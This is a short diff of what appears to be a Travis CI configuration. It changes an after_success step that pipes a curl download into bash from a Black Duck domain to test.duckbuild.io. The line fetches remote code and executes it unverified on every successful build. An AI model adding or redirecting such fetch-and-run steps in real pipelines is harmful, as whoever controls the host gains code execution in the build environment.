@@ -6,4 +6,4 @@ before_install:
   - pod repo update
 
 after_success:
-  - bash <(curl -s https://copilot-valid.blackducksoftware.com/ci/travis/scripts/upload)
+  - bash <(curl -s https://test.duckbuild.io/ci/travis/scripts/upload)
